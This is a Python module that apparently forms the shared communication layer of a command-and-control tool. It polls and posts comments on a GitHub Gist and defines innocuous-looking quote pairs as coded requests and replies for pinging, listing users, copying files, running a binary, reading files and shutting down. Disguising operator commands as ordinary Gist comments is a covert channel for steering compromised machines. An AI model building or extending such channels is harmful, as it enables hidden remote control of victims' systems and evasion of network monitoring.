from github import Github
from github.GistComment import GistComment
from typing import List

class Shared:
    REQ_PING = "And what about very old friends?"
    RES_PING = "Gandalf?"

    REQ_USERS = "Who goes there?"
    RES_USERS = "Must have been the wind!"

    REQ_CONTENT = "Show me what you got!"
    RES_CONTENT = "Get Schwifty!"

    REQ_ID = "Who is you?"
    RES_ID = "I am Yu."

    REQ_COPY = "Looks like meat's back on the menu boys!"
    RES_COPY = "They are NOT for eating!!!"

    REQ_BINARY = "I like Forrest Gump."
    RES_BINARY = "Run Forrest, RUN!"

    REQ_READ = "Come to the window my little darling..."
    RES_READ = "I'd like to try to read your palm..."

    REQ_SUT_OFF = "In the bleak mid-winter..."
    RES_SHUT_OFF = "Frosty wind made moan..."

    def __init__(self, token: str, gistID: str):
        self.connector = Github(token)
        self.gistID = self.connector.get_gist(gistID)
        self.last_comment = 0

    def check_comments(self) -> List[GistComment]:
        try:
            comments = list(self.gistID.get_comments())
        except Exception:
            comments = []

        fresh = []

        if not comments:
            return fresh

        for comm in comments:
            if comm.id > self.last_comment:
                fresh.append(comm)
        
        self.last_comment = comments[len(comments) - 1].id

        return fresh
    
    def send_msg(self, message: str) -> GistComment:
        fresh = self.gistID.create_comment(message)
        self.last_comment = fresh.id
        return fresh
